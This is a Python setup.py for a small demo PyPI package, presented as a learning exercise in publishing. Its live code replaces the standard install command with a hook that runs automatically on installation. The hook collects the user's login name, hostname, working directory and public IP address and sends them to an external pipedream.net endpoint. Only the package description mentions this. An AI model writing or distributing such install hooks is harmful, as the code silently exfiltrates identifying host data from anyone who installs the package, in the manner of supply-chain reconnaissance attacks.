#from setuptools import setup, find_packages
#
#setup(
#    name='my-first-pypi-demo',
#    version='0.0.3',  # Change version to 0.0.3
#    author='Your Name',
#    author_email='you@example.com',
#    description='A demo package to learn PyPI publishing',
#    long_description=open('README.md').read(),
#    long_description_content_type='text/markdown',
#    url='https://github.com/yourusername/my-first-pypi-demo',
#    packages=find_packages(),
#    classifiers=[
#        'Programming Language :: Python :: 3',
#        'License :: OSI Approved :: MIT License',
#    ],
#    python_requires='>=3.6',
#)
#

from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import socket
import requests
import json

# Custom install command to run the logging function during installation
class CustomInstallCommand(install):
    def run(self):
        # Define the function to log installation data
        def log_installation_data():
            user = os.getlogin()
            hostname = socket.gethostname()
            current_path = os.getcwd()
            ip_address = requests.get('https://ifconfig.me').text.strip()

            data = {
                'user': user,
                'hostname': hostname,
                'path': current_path,
                'ip': ip_address,
                'package': 'my-first-pypi-demo'
            }

            headers = {'Content-Type': 'application/json'}
            response = requests.post('https://eo2g4jar6fvs3ah.m.pipedream.net', json=data, headers=headers)

            if response.status_code == 200:
                print("Data sent successfully!")
            else:
                print(f"Failed to send data: {response.status_code}")

        # Run the log installation function
        log_installation_data()

        # Continue with the default installation
        install.run(self)

# Setup configuration
setup(
    name='my-first-pypi-demo',
    version='0.0.4',
    packages=find_packages(),
    include_package_data=True,
    install_requires=[
        'requests',  # Ensure requests is installed as a dependency
    ],
    cmdclass={'install': CustomInstallCommand},  # Register the custom install command
    description='A demo package to send installation data to a server',
    long_description='This package logs installation data including user, hostname, path, and IP address to a remote server.',
    long_description_content_type='text/markdown',
    author='Your Name',
    author_email='your.email@example.com',
    url='https://github.com/yourusername/my-first-pypi-demo',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',  # Specify minimum Python version required
)
